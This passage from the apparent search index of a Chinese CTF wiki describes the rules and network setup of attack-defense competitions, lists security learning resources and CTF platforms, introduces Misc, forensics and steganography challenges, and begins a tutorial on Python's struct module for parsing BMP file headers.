\u6765\u5f97\u5206\uff0c\u4fee\u8865\u81ea\u8eab\u670d\u52a1\u6f0f\u6d1e\u8fdb\u884c\u9632\u5fa1\u4ece\u800c\u9632\u6b62\u6263\u5206\uff08\u4e00\u822c\u6765\u8bf4\u9632\u5fa1\u53ea\u80fd\u907f\u514d\u4e22\u5206\uff0c\u5f53\u7136\u6709\u7684\u6bd4\u8d5b\u5728\u9632\u5fa1\u4e0a\u53ef\u4ee5\u5f97\u5206\uff09\u3002</p> <p>\u653b\u9632\u6a21\u5f0f\u53ef\u4ee5\u5b9e\u65f6\u901a\u8fc7\u5f97\u5206\u53cd\u6620\u51fa\u6bd4\u8d5b\u60c5\u51b5\uff0c\u6700\u7ec8\u4e5f\u4ee5\u5f97\u5206\u76f4\u63a5\u5206\u51fa\u80dc\u8d1f\uff0c\u662f\u4e00\u79cd\u7ade\u4e89\u6fc0\u70c8\uff0c\u5177\u6709\u5f88\u5f3a\u89c2\u8d4f\u6027\u548c\u9ad8\u5ea6\u900f\u660e\u6027\u7684\u7f51\u7edc\u5b89\u5168\u8d5b\u5236\u3002\u5728\u8fd9\u79cd\u8d5b\u5236\u4e2d\uff0c\u4e0d\u4ec5\u4ec5\u662f\u6bd4\u53c2\u8d5b\u961f\u5458\u7684\u667a\u529b\u548c\u6280\u672f\uff0c\u4e5f\u6bd4\u4f53\u529b\uff08\u56e0\u4e3a\u6bd4\u8d5b\u4e00\u822c\u90fd\u4f1a\u6301\u7eed 48 \u5c0f\u65f6\uff09\uff0c\u540c\u65f6\u4e5f\u6bd4\u56e2\u961f\u4e4b\u95f4\u7684\u5206\u5de5\u914d\u5408\u4e0e\u5408\u4f5c\u3002</p> <p>\u4e00\u822c\u6bd4\u8d5b\u7684\u5177\u4f53\u73af\u5883\u4f1a\u5728\u5f00\u8d5b\u524d\u4e00\u5929\u6216\u8005\u5f53\u5929\u5f00\u8d5b\u524d\u534a\u5c0f\u65f6\u7531\u6bd4\u8d5b\u4e3b\u529e\u65b9\u7ed9\u51fa\uff08\u662f\u4e00\u4efd\u51e0\u9875\u7684\u5c0f\u6587\u6863\uff09\u3002\u5728\u8fd9\u4e00\u6bb5\u65f6\u95f4\u5185\uff0c\u4f60\u9700\u8981\u6839\u636e\u4e3b\u529e\u65b9\u63d0\u4f9b\u7684\u6587\u6863\u719f\u6089\u73af\u5883\u5e76\u505a\u597d\u9632\u5fa1\u3002</p> <p>\u5728\u6bd4\u8d5b\u5f00\u59cb\u524d\u534a\u5c0f\u65f6\uff0c\u8fd9\u534a\u5c0f\u65f6\u5185\u662f\u65e0\u6cd5\u8fdb\u884c\u653b\u51fb\u7684\uff0c\u5404\u652f\u961f\u4f0d\u90fd\u4f1a\u52a0\u7d27\u719f\u6089\u6bd4\u8d5b\u7f51\u7edc\u73af\u5883\uff0c\u5e76\u505a\u597d\u9632\u5fa1\u51c6\u5907\u3002\u81f3\u4e8e\u654c\u65b9 Gamebox \u7684 IP \u5730\u5740\uff0c\u5219\u9700\u8981\u9760\u4f60\u81ea\u5df1\u5728\u7ed9\u51fa\u7f51\u6bb5\u4e2d\u53d1\u73b0\u3002</p> <p>\u5982\u679c\u662f\u5206\u4e3a\u4e0a\u5348\u4e0b\u5348\u4e24\u573a\u653b\u9632\u8d5b\u7684\u8bdd\uff0c\u90a3\u4e48\u4e0a\u5348\u548c\u4e0b\u5348\u7684 Gamebox \u6f0f\u6d1e\u670d\u52a1\u4f1a\u66f4\u6362\uff08\u907f\u514d\u6bd4\u8d5b\u4e2d\u9014\u4f11\u606f\u65f6\u9009\u624b\u4ea4\u6d41\uff09\uff0c\u4f46\u7ba1\u7406\u65f6\u8981\u7528\u7684 IP \u5730\u5740\u4ec0\u4e48\u7684\u4e0d\u4f1a\u6539\u53d8\u3002\u4e5f\u5c31\u662f \u4e0b\u5348\u4f1a\u6362\u65b0\u9898 \u3002</p> <p>\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u4e3b\u529e\u65b9\u4f1a\u63d0\u4f9b\u7f51\u7ebf\uff0c\u4f46\u5e76\u4e0d\u4f1a\u63d0\u4f9b\u7f51\u7ebf\u8f6c\u63a5\u53e3\uff0c\u6240\u4ee5\u9700\u8981\u81ea\u5907\u3002</p>"},{"location":"introduction/mode/#_9","title":"\u57fa\u672c\u89c4\u5219","text":"<p>\u653b\u9632\u6a21\u5f0f\u4e00\u822c\u7684\u89c4\u5219\u5982\u4e0b</p> <ul> <li>\u6218\u961f\u521d\u59cb\u5206\u6570\u5747\u4e3a x \u5206</li> <li>\u6bd4\u8d5b\u4ee5 5/10 \u5206\u949f\u4e3a\u4e00\u4e2a\u56de\u5408\uff0c\u6bcf\u56de\u5408\u4e3b\u529e\u65b9\u4f1a\u66f4\u65b0\u5df2\u653e\u51fa\u670d\u52a1\u7684 Flag</li> <li>\u6bcf\u56de\u5408\u5185\uff0c\u4e00\u4e2a\u6218\u961f\u7684\u4e00\u4e2a\u670d\u52a1\u88ab\u6e17\u900f\u653b\u51fb\u6210\u529f\uff08\u88ab\u62ff Flag \u5e76\u63d0\u4ea4\uff09\uff0c\u5219\u6263\u9664\u4e00\u5b9a\u5206\u6570\uff0c\u653b\u51fb\u6210\u529f\u7684\u6218\u961f\u5e73\u5206\u8fd9\u4e9b\u5206\u6570\u3002</li> <li>\u6bcf\u56de\u5408\u5185\uff0c\u5982\u679c\u6218\u961f\u80fd\u591f\u7ef4\u62a4\u81ea\u5df1\u7684\u670d\u52a1\u6b63\u5e38\u8fd0\u884c\uff0c\u5219\u5206\u6570\u4e0d\u4f1a\u51cf\u5c11\uff08\u5982\u679c\u9632\u5fa1\u6210\u529f\u52a0\u5206\u5219\u4f1a\u52a0\u5206\uff09\uff1b</li> <li>\u5982\u679c\u4e00\u4e2a\u670d\u52a1\u5b95\u673a\u6216\u5f02\u5e38\u65e0\u6cd5\u901a\u8fc7\u6d4b\u8bd5\uff0c\u5219\u53ef\u80fd\u4f1a\u6263\u5206\uff0c\u670d\u52a1\u6b63\u5e38\u7684\u6218\u961f\u5e73\u5206\u8fd9\u4e9b\u5206\u3002\u5f80\u5f80\u670d\u52a1\u5f02\u5e38\u4f1a\u6263\u9664\u8f83\u591a\u7684\u5206\u6570\u3002</li> <li>\u5982\u679c\u8be5\u56de\u5408\u5185\u6240\u6709\u6218\u961f\u7684\u670d\u52a1\u90fd\u5f02\u5e38\uff0c\u5219\u8ba4\u4e3a\u662f\u4e0d\u53ef\u6297\u62d2\u56e0\u7d20\u9020\u6210\uff0c\u5206\u6570\u90fd\u4e0d\u51cf\u5c11\u3002</li> <li>\u6bcf\u56de\u5408\u5185\uff0c\u670d\u52a1\u5f02\u5e38\u548c\u88ab\u62ff Flag \u53ef\u4ee5\u540c\u65f6\u53d1\u751f\uff0c\u5373\u6218\u961f\u5728\u4e00\u4e2a\u56de\u5408\u5185\u5355\u4e2a\u670d\u52a1\u53ef\u80fd\u4f1a\u6263\u9664\u4e24\u8005\u53e0\u52a0\u7684\u5206\u6570\u3002</li> <li>\u7981\u6b62\u961f\u4f0d\u4f7f\u7528\u901a\u7528\u9632\u5fa1\u65b9\u6cd5</li> <li>\u8bf7\u53c2\u8d5b\u961f\u4f0d\u5728\u6bd4\u8d5b\u5f00\u59cb\u65f6\u5bf9\u6240\u6709\u670d\u52a1\u8fdb\u884c\u5907\u4efd\uff0c\u82e5\u56e0\u81ea\u8eab\u539f\u56e0\u5bfc\u81f4\u670d\u52a1\u6c38\u4e45\u635f\u574f\u6216\u4e22\u5931\uff0c\u65e0\u6cd5\u6062\u590d\uff0c\u4e3b\u529e\u65b9\u4e0d\u63d0\u4f9b\u91cd\u7f6e\u670d\u52a1</li> <li>\u7981\u6b62\u5bf9\u8d5b\u9898\u4ee5\u5916\u7684\u6bd4\u8d5b\u5e73\u53f0\u53d1\u8d77\u653b\u51fb\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u5728 gamebox \u63d0\u6743 root\u3001\u5229\u7528\u4e3b\u529e\u65b9\u5e73\u53f0\u6f0f\u6d1e\u7b49\uff0c\u8fdd\u89c4\u8005\u7acb\u523b\u88ab\u53d6\u6d88\u53c2\u8d5b\u8d44\u683c</li> <li>\u53c2\u8d5b\u961f\u4f0d\u5982\u679c\u53d1\u73b0\u5176\u4ed6\u961f\u4f0d\u5b58\u5728\u8fdd\u89c4\u884c\u4e3a\uff0c\u8bf7\u7acb\u523b\u4e3e\u62a5\uff0c\u6211\u4eec\u4f1a\u4e25\u683c\u5ba1\u6838\u5e76\u4f5c\u51fa\u76f8\u5e94\u5224\u7f5a\u3002</li> </ul>"},{"location":"introduction/mode/#_10","title":"\u7f51\u7edc\u73af\u5883","text":"<p>\u6587\u6863\u4e0a\u4e00\u822c\u90fd\u4f1a\u6709\u6bd4\u8d5b\u73af\u5883\u7684 \u7f51\u7edc\u62d3\u6251\u56fe \uff08\u5982\u4e0b\u56fe\uff09\uff0c\u6bcf\u652f\u961f\u4f0d\u4f1a\u7ef4\u62a4\u82e5\u5e72\u7684 Gamebox\uff08\u5df1\u65b9\u670d\u52a1\u5668\uff09 \uff0cGamebox \u4e0a\u90e8\u7f72\u6709\u5b58\u5728\u6f0f\u6d1e\u7684\u670d\u52a1\u3002</p> <p></p> <p>\u6587\u6863\u4e0a\u4f1a\u5305\u62ec\u9009\u624b\uff0c\u653b\u9632\u73af\u5883\uff0c\u4e3b\u529e\u65b9\u4e09\u8005\u7684\u73af\u5883\u3002</p> <p>\u9009\u624b\u9700\u8981\u5728\u4e2a\u4eba\u7535\u8111\u4e0a\u914d\u7f6e\u6216\u8005 DHCP \u81ea\u52a8\u83b7\u53d6</p> <ul> <li>IP \u5730\u5740</li> <li>\u7f51\u5173</li> <li>\u63a9\u7801DNS \u670d\u52a1\u5668\u5730\u5740</li> </ul> <p>\u653b\u9632\u73af\u5883</p> <ul> <li>Gamebox \u6240\u5904\u5730\u5740\uff0c\u5305\u62ec\u5df1\u65b9\u548c\u5176\u4ed6\u961f\u4f0d\u7684\u5730\u5740\u3002</li> <li>\u6bd4\u8d5b\u4e00\u822c\u4f1a\u63d0\u4f9b\u961f\u4f0d\u7684 id \u4e0e\u5bf9\u5e94 ip \u7684\u6620\u5c04\u8868\uff0c\u4ee5\u4fbf\u4e8e\u8ba9\u9009\u624b\u6307\u5b9a\u6070\u5f53\u7684\u653b\u9632\u7b56\u7565\u3002</li> </ul> <p>\u4e3b\u529e\u65b9\u73af\u5883</p> <ul> <li>\u6bd4\u8d5b\u7b54\u9898\u5e73\u53f0</li> <li>\u63d0\u4ea4 flag \u63a5\u53e3</li> <li>\u6d41\u91cf\u8bbf\u95ee\u63a5\u53e3</li> </ul>"},{"location":"introduction/mode/#gamebox","title":"\u8bbf\u95ee Gamebox","text":"<p>\u53c2\u8d5b\u6587\u6863\u4e2d\u4f1a\u7ed9\u51fa\u961f\u4f0d\u767b\u5f55 gamebox \u7684\u65b9\u5f0f\uff0c\u4e00\u822c\u6765\u8bf4\u5982\u4e0b</p> <ul> <li>\u7528\u6237\u540d\u4e3a ctf</li> <li>\u4e00\u822c\u4f1a\u901a\u8fc7 ssh \u767b\u5f55\uff0c\u767b\u5f55\u65b9\u5f0f\u4e3a\u5bc6\u7801\u6216\u8005\u79c1\u94a5\u3002</li> </ul> <p>\u81ea\u7136\uff0c\u5728\u767b\u5f55\u4e0a\u6218\u961f\u673a\u5668\u540e\u5e94\u8be5\u4fee\u6539\u6240\u6709\u7684\u9ed8\u8ba4\u5bc6\u7801\uff0c\u540c\u65f6\u4e0d\u5e94\u8be5\u8bbe\u7f6e\u5f31\u5bc6\u7801\u3002</p>"},{"location":"introduction/resources/","title":"\u5b66\u4e60\u8d44\u6e90","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"introduction/resources/#_2","title":"\u5728\u7ebf\u5b66\u4e60","text":"<ul> <li>i \u6625\u79cb-\u4e13\u4e1a\u7684\u7f51\u7edc\u5b89\u5168|\u4fe1\u606f\u5b89\u5168\u5728\u7ebf\u5b66\u4e60\u57f9\u8bad\u5e73\u53f0</li> <li>\u770b\u96ea\u77e5\u8bc6\u5e93</li> <li>CTFHub</li> </ul>"},{"location":"introduction/resources/#_3","title":"\u5b66\u4e60\u8def\u7ebf","text":"<ul> <li>\u77e5\u9053\u521b\u5b87\u7814\u53d1\u6280\u80fd\u8868 v3.1</li> <li>\u6f0f\u6d1e\u94f6\u884c(BUGBANK)\u6280\u80fd\u6811 </li> <li>\u5b89\u5168\u6280\u80fd\u6811\u7b80\u7248 by \u4f59\u5f26</li> <li>\u5b89\u5168\u7c7b\u601d\u7ef4\u5bfc\u56fe by phith0n</li> <li>\u4fe1\u606f\u5b89\u5168\u4ece\u4e1a\u8005\u4e66\u5355\u63a8\u8350</li> <li>CTFHub \u6280\u80fd\u6811</li> </ul>"},{"location":"introduction/resources/#_4","title":"\u4fe1\u606f\u8d44\u8baf","text":"<ul> <li>FreeBuf.COM | \u5173\u6ce8\u9ed1\u5ba2\u4e0e\u6781\u5ba2</li> <li>\u5b89\u5168\u5ba2 - \u6709\u601d\u60f3\u7684\u5b89\u5168\u65b0\u5a92\u4f53</li> <li>\u5636\u543c RoarTalk \u2013 \u56de\u5f52\u6700\u672c\u8d28\u7684\u4fe1\u606f\u5b89\u5168</li> <li>Sec-News \u5b89\u5168\u6587\u6458</li> </ul>"},{"location":"introduction/resources/#_5","title":"\u6280\u672f\u8bba\u575b","text":"<ul> <li>\u543e\u7231\u7834\u89e3</li> <li>\u770b\u96ea\u8bba\u575b</li> <li>\u5148\u77e5\u793e\u533a</li> <li>i\u6625\u79cb\u8bba\u575b</li> </ul>"},{"location":"introduction/resources/#ctf","title":"CTF \u8d5b\u4e8b","text":"<ul> <li>XCTF\u793e\u533a</li> <li>CTFtime</li> <li>CTFHub \u8d5b\u4e8b\u4e2d\u5fc3</li> </ul>"},{"location":"introduction/resources/#ctf-oj","title":"CTF OJ","text":"<ul> <li>XCTF OJ</li> <li>CTF\u5927\u672c\u8425</li> <li>pwnhub</li> <li>\u5357\u90ae\u7f51\u7edc\u653b\u9632\u8bad\u7ec3\u5e73\u53f0</li> <li>HackingLab \u7f51\u7edc\u4fe1\u606f\u5b89\u5168\u653b\u9632\u5b66\u4e60\u5e73\u53f0</li> <li>BugkuCTF</li> <li>WeChall</li> <li>Sniper OJ</li> <li>Jarvis OJ</li> <li>CTF Learn</li> <li>Hackme CTF</li> <li>Practice CTF List</li> <li>CTFHub \u771f\u9898\u590d\u73b0</li> </ul>"},{"location":"introduction/resources/#ctf_1","title":"CTF \u5de5\u5177","text":"<ul> <li>\u770b\u96ea\u5de5\u5177</li> <li>\u543e\u7231\u7834\u89e3\u5de5\u5177</li> <li>CTF\u5728\u7ebf\u5de5\u5177 by CTFcode</li> <li>CTF\u5728\u7ebf\u5de5\u5177\u7bb1 by bugku</li> <li>CTF\u5de5\u5177\u8d44\u6e90\u5e93 by HBCTF team</li> <li>ctf-tools by zardus</li> <li>The Cyber Swiss Army Knife</li> <li>CTFHub \u5de5\u5177\u5e93</li> </ul>"},{"location":"introduction/resources/#ctf-writeup","title":"CTF Writeup \u96c6\u5408","text":"<ul> <li>CTFs Writeup \u96c6\u9526</li> <li>CTF solution by p4 team</li> <li>CTFHub Writeup</li> </ul>"},{"location":"introduction/resources/#_6","title":"\u8d44\u6e90\u805a\u5408","text":"<ul> <li>\u6e17\u900f\u5e08\u5bfc\u822a</li> <li>\u5b89\u5168\u5708</li> <li>\u7eb3\u5a01\u5b89\u5168\u5bfc\u822a</li> <li>XssSafe\u5bfc\u822a</li> <li>Coco413 Blog</li> <li>\u5b89\u5168\u5bfc\u822a</li> <li>SecWeb</li> </ul>"},{"location":"misc/introduction/","title":"\u6742\u9879\u7b80\u4ecb","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>Misc \u662f\u82f1\u6587 Miscellaneous \u7684\u524d\u56db\u4e2a\u5b57\u6bcd\uff0c\u6742\u9879\u3001\u6df7\u5408\u4f53\u3001\u5927\u6742\u70e9\u7684\u610f\u601d\u3002</p> <p>Misc \u5728\u56fd\u5916\u7684\u6bd4\u8d5b\u4e2d\u5176\u5b9e\u53c8\u88ab\u5177\u4f53\u5212\u5206\u4e3a\u5404\u4e2a\u5c0f\u5757\uff0c\u6709</p> <ul> <li>Recon</li> <li>Forensic</li> <li>Stego</li> <li>Misc</li> <li>\u2026\u2026</li> </ul> <p>\u5728\u56fd\u5185\u7684\u6bd4\u8d5b\u4e2d\uff0c\u88ab\u7edf\u4e00\u5212\u5206\u5165 Misc \u9886\u57df\uff0c\u6709\u65f6 Crypto\uff08\u5c24\u5176\u662f\u53e4\u5178\u5bc6\u7801\uff09\u4e5f\u88ab\u5212\u5165\u5176\u4e2d\u3002</p> <p>\u5728 Misc \u8fd9\u4e00\u7ae0\u8282\u4e2d\uff0c\u5c06\u4ece\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\u4ecb\u7ecd\u8fd9\u4e00\u5757\u7684\u77e5\u8bc6\uff1a</p> <ul> <li> <p>Recon\uff08\u4fe1\u606f\u641c\u96c6\uff09</p> <p>\u4e3b\u8981\u4ecb\u7ecd\u4e00\u4e9b\u83b7\u53d6\u4fe1\u606f\u7684\u6e20\u9053\u548c\u4e00\u4e9b\u5229\u7528\u767e\u5ea6\u3001\u8c37\u6b4c\u7b49\u641c\u7d22\u5f15\u64ce\u7684\u6280\u5de7</p> </li> <li> <p>Encode\uff08\u7f16\u7801\u8f6c\u6362\uff09</p> <p>\u4e3b\u8981\u4ecb\u7ecd\u5728 CTF \u6bd4\u8d5b\u4e2d\u4e00\u4e9b\u5e38\u89c1\u7684\u7f16\u7801\u5f62\u5f0f\u4ee5\u53ca\u8f6c\u6362\u7684\u6280\u5de7\u548c\u5e38\u89c1\u65b9\u5f0f</p> </li> <li> <p>Forensic &amp;&amp; Stego\uff08\u6570\u5b57\u53d6\u8bc1 &amp;&amp; \u9690\u5199\u5206\u6790\uff09</p> <p>\u9690\u5199\u53d6\u8bc1\u662f Misc \u4e2d\u6700\u4e3a\u91cd\u8981\u7684\u4e00\u5757\uff0c\u5305\u62ec\u6587\u4ef6\u5206\u6790\u3001\u9690\u5199\u3001\u5185\u5b58\u955c\u50cf\u5206\u6790\u548c\u6d41\u91cf\u6293\u5305\u5206\u6790\u7b49\u7b49\uff0c\u6d89\u53ca\u5de7\u5999\u7684\u7f16\u7801\u3001\u9690\u85cf\u6570\u636e\u3001\u5c42\u5c42\u5d4c\u5957\u7684\u6587\u4ef6\u4e2d\u7684\u6587\u4ef6\uff0c\u7075\u6d3b\u5229\u7528\u641c\u7d22\u5f15\u64ce\u83b7\u53d6\u6240\u9700\u8981\u7684\u4fe1\u606f\u7b49\u7b49\u3002</p> </li> </ul> <p>CTF \u4e2d Misc \u4e0e\u73b0\u5b9e\u4e2d\u7684\u53d6\u8bc1\u4e0d\u540c\uff0c\u73b0\u5b9e\u4e2d\u7684\u53d6\u8bc1\u5f88\u5c11\u4f1a\u6d89\u53ca\u5de7\u5999\u7684\u7f16\u7801\u52a0\u5bc6\uff0c\u6570\u636e\u9690\u85cf\uff0c\u88ab\u5206\u6563\u5d4c\u5957\u5728\u5404\u5904\u7684\u6587\u4ef6\u5b57\u7b26\u4e32\uff0c\u6216\u662f\u5176\u4ed6\u8111\u6d1e\u7c7b\u7684 Challenge\u3002\u5f88\u591a\u65f6\u5019\u662f\u53bb\u7cbe\u5fc3\u6062\u590d\u4e00\u4e2a\u6b8b\u635f\u7684\u6587\u4ef6\uff0c\u6316\u6398\u635f\u574f\u786c\u76d8\u4e2d\u7684\u86db\u4e1d\u9a6c\u8ff9,\u6216\u8005\u4ece\u5185\u5b58\u955c\u50cf\u4e2d\u62bd\u53d6\u6709\u7528\u7684\u4fe1\u606f\u3002</p> <p>\u73b0\u5b9e\u7684\u53d6\u8bc1\u9700\u8981\u4ece\u4e1a\u8005\u80fd\u591f\u627e\u51fa\u95f4\u63a5\u7684\u6076\u610f\u884c\u4e3a\u8bc1\u636e\uff1a\u653b\u51fb\u8005\u653b\u51fb\u7cfb\u7edf\u7684\u75d5\u8ff9\uff0c\u6216\u662f\u5185\u90e8\u5a01\u80c1\u884c\u4e3a\u7684\u75d5\u8ff9\u3002\u5b9e\u9645\u5de5\u4f5c\u4e2d\u8ba1\u7b97\u673a\u53d6\u8bc1\u5927\u90e8\u5206\u662f\u4ece\u65e5\u5fd7\u3001\u5185\u5b58\u3001\u6587\u4ef6\u7cfb\u7edf\u4e2d\u627e\u51fa\u72af\u7f6a\u7ebf\u7d22\uff0c\u5e76\u627e\u51fa\u4e0e\u6587\u4ef6\u6216\u6587\u4ef6\u7cfb\u7edf\u4e2d\u6570\u636e\u7684\u5173\u7cfb\u3002\u800c\u6d41\u91cf\u53d6\u8bc1\u6bd4\u8d77\u5185\u5bb9\u6570\u636e\u7684\u5206\u6790\uff0c\u66f4\u6ce8\u91cd\u5143\u6570\u636e\u7684\u5206\u6790\uff0c\u4e5f\u5c31\u662f\u5f53\u524d\u4e0d\u540c\u7aef\u70b9\u95f4\u5e38\u7528 TLS \u52a0\u5bc6\u7684\u7f51\u7edc\u4f1a\u8bdd\u3002</p> <p>Misc \u662f\u5207\u5165 CTF \u7ade\u8d5b\u9886\u57df\u3001\u57f9\u517b\u5174\u8da3\u7684\u6700\u4f73\u5165\u53e3\u3002Misc \u8003\u5bdf\u57fa\u672c\u77e5\u8bc6\uff0c\u5bf9\u5b89\u5168\u6280\u80fd\u7684\u5404\u4e2a\u5c42\u9762\u90fd\u6709\u4e0d\u540c\u7a0b\u5ea6\u7684\u6d89\u53ca\uff0c\u53ef\u4ee5\u5728\u5f88\u5927\u7a0b\u5ea6\u4e0a\u542f\u53d1\u601d\u7ef4\u3002</p> <p></p>"},{"location":"misc/prefix/","title":"\u53d6\u8bc1\u9690\u5199\u524d\u7f6e\u6280\u672f","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u5927\u90e8\u5206\u7684 CTF \u6bd4\u8d5b\u4e2d\uff0c\u53d6\u8bc1\u53ca\u9690\u5199\u4e24\u8005\u5bc6\u4e0d\u53ef\u5206\uff0c\u4e24\u8005\u6240\u9700\u8981\u7684\u77e5\u8bc6\u4e5f\u76f8\u8f85\u76f8\u6210\uff0c\u6240\u4ee5\u8fd9\u91cc\u4e5f\u5c06\u5bf9\u4e24\u8005\u4e00\u8d77\u4ecb\u7ecd\u3002</p> <p>\u4efb\u4f55\u8981\u6c42\u68c0\u67e5\u4e00\u4e2a\u9759\u6001\u6570\u636e\u6587\u4ef6\u4ece\u800c\u83b7\u53d6\u9690\u85cf\u4fe1\u606f\u7684\u90fd\u53ef\u4ee5\u88ab\u8ba4\u4e3a\u662f\u9690\u5199\u53d6\u8bc1\u9898\uff08\u9664\u975e\u5355\u7eaf\u5730\u662f\u5bc6\u7801\u5b66\u7684\u77e5\u8bc6\uff09\uff0c\u4e00\u4e9b\u4f4e\u5206\u7684\u9690\u5199\u53d6\u8bc1\u53c8\u5e38\u5e38\u4e0e\u53e4\u5178\u5bc6\u7801\u5b66\u7ed3\u5408\u5728\u4e00\u8d77\uff0c\u800c\u9ad8\u5206\u7684\u9898\u76ee\u5219\u901a\u5e38\u7528\u4e0e\u4e00\u4e9b\u8f83\u4e3a\u590d\u6742\u7684\u73b0\u4ee3\u5bc6\u7801\u5b66\u77e5\u8bc6\u7ed3\u5408\u5728\u4e00\u8d77\uff0c\u5f88\u597d\u5730\u4f53\u73b0\u4e86 Misc \u9898\u7684\u7279\u70b9\u3002</p>"},{"location":"misc/prefix/#_2","title":"\u524d\u7f6e\u6280\u80fd","text":"<ul> <li> <p>\u4e86\u89e3\u5e38\u89c1\u7684\u7f16\u7801</p> <p>\u80fd\u591f\u5bf9\u6587\u4ef6\u4e2d\u51fa\u73b0\u7684\u4e00\u4e9b\u7f16\u7801\u8fdb\u884c\u89e3\u7801\uff0c\u5e76\u4e14\u5bf9\u4e00\u4e9b\u7279\u6b8a\u7684\u7f16\u7801\uff08Base64\u3001\u5341\u516d\u8fdb\u5236\u3001\u4e8c\u8fdb\u5236\u7b49\uff09\u6709\u4e00\u5b9a\u7684\u654f\u611f\u5ea6\uff0c\u5bf9\u5176\u8fdb\u884c\u8f6c\u6362\u5e76\u5f97\u5230\u6700\u7ec8\u7684 flag\u3002</p> </li> <li> <p>\u80fd\u591f\u5229\u7528\u811a\u672c\u8bed\u8a00\uff08Python \u7b49\uff09\u53bb\u64cd\u4f5c\u4e8c\u8fdb\u5236\u6570\u636e</p> </li> <li>\u719f\u77e5\u5e38\u89c1\u6587\u4ef6\u7684\u6587\u4ef6\u683c\u5f0f\uff0c\u5c24\u5176\u662f\u5404\u7c7b \u6587\u4ef6\u5934\u3001\u534f\u8bae\u3001\u7ed3\u6784\u7b49</li> <li>\u7075\u6d3b\u8fd0\u7528\u5e38\u89c1\u7684\u5de5\u5177</li> </ul>"},{"location":"misc/prefix/#python","title":"Python \u64cd\u4f5c\u4e8c\u8fdb\u5236\u6570\u636e","text":""},{"location":"misc/prefix/#struct","title":"struct \u6a21\u5757","text":"<p>\u6709\u7684\u65f6\u5019\u9700\u8981\u7528 Python \u5904\u7406\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u6bd4\u5982\uff0c\u5b58\u53d6\u6587\u4ef6\uff0csocket \u64cd\u4f5c\u65f6\u3002\u8fd9\u65f6\u5019\uff0c\u53ef\u4ee5\u4f7f\u7528 Python \u7684 struct \u6a21\u5757\u6765\u5b8c\u6210\u3002</p> <p>struct \u6a21\u5757\u4e2d\u6700\u91cd\u8981\u7684\u4e09\u4e2a\u51fd\u6570\u662f <code>pack()</code>\u3001<code>unpack()</code> \u548c <code>calcsize()</code></p> <ul> <li><code>pack(fmt, v1, v2, ...)</code> \u6309\u7167\u7ed9\u5b9a\u7684\u683c\u5f0f\uff08fmt\uff09\uff0c\u628a\u6570\u636e\u5c01\u88c5\u6210\u5b57\u7b26\u4e32\uff08\u5b9e\u9645\u4e0a\u662f\u7c7b\u4f3c\u4e8ec\u7ed3\u6784\u4f53\u7684\u5b57\u8282\u6d41\uff09</li> <li><code>unpack(fmt, string)</code> \u6309\u7167\u7ed9\u5b9a\u7684\u683c\u5f0f\uff08fmt\uff09\u89e3\u6790\u5b57\u8282\u6d41 string\uff0c\u8fd4\u56de\u89e3\u6790\u51fa\u6765\u7684 tuple</li> <li><code>calcsize(fmt)</code> \u8ba1\u7b97\u7ed9\u5b9a\u7684\u683c\u5f0f\uff08fmt\uff09\u5360\u7528\u591a\u5c11\u5b57\u8282\u7684\u5185\u5b58</li> </ul> <p>\u8fd9\u91cc\u6253\u5305\u683c\u5f0f <code>fmt</code> \u786e\u5b9a\u4e86\u5c06\u53d8\u91cf\u6309\u7167\u4ec0\u4e48\u65b9\u5f0f\u6253\u5305\u6210\u5b57\u8282\u6d41\uff0c\u5176\u5305\u542b\u4e86\u4e00\u7cfb\u5217\u7684\u683c\u5f0f\u5b57\u7b26\u4e32\u3002\u8fd9\u91cc\u5c31\u4e0d\u518d\u7ed9\u51fa\u4e0d\u540c\u683c\u5f0f\u5b57\u7b26\u4e32\u7684\u542b\u4e49\u4e86\uff0c\u8be6\u7ec6\u7ec6\u8282\u53ef\u4ee5\u53c2\u7167 Python Doc</p> <pre><code>&gt;&gt;&gt; import struct\n&gt;&gt;&gt; struct.pack('&gt;I',16)\n'\\x00\\x00\\x00\\x10'\n</code></pre> <p><code>pack</code> \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5904\u7406\u6307\u4ee4\uff0c<code>'&gt;I'</code> \u7684\u610f\u601d\u662f\uff1a<code>&gt;</code> \u8868\u793a\u5b57\u8282\u987a\u5e8f\u662f Big-Endian\uff0c\u4e5f\u5c31\u662f\u7f51\u7edc\u5e8f\uff0c<code>I</code> \u8868\u793a 4 \u5b57\u8282\u65e0\u7b26\u53f7\u6574\u6570\u3002</p> <p>\u540e\u9762\u7684\u53c2\u6570\u4e2a\u6570\u8981\u548c\u5904\u7406\u6307\u4ee4\u4e00\u81f4\u3002</p> <p>\u8bfb\u5165\u4e00\u4e2a BMP \u6587\u4ef6\u7684\u524d 30 \u5b57\u8282\uff0c\u6587\u4ef6\u5934\u7684\u7ed3\u6784\u6309\u987a\u5e8f\u5982\u4e0b</p> <ul> <li>\u4e24\u4e2a\u5b57\u8282\uff1a<code>BM</code> \u8868\u793a Windows \u4f4d\u56fe\uff0c<code>BA</code> \u8868\u793a OS/2 \u4f4d\u56fe</li> <li>\u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1a\u8868\u793a\u4f4d\u56fe\u5927\u5c0f</li> <li>\u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1a\u4fdd\u7559\u4f4d\uff0c\u59cb\u7ec8\u4e3a 0</li> <li>\u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1a\u5b9e\u9645\u56fe\u50cf\u7684\u504f\u79fb\u91cf</li> <li>\u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1aHeader \u7684\u5b57\u8282\u6570</li> <li>\u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1a\u56fe\u50cf\u5bbd\u5ea6</li> <li>\u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1a\u56fe\u50cf\u9ad8\u5ea6</li> <li>\u4e00\u4e2a 2 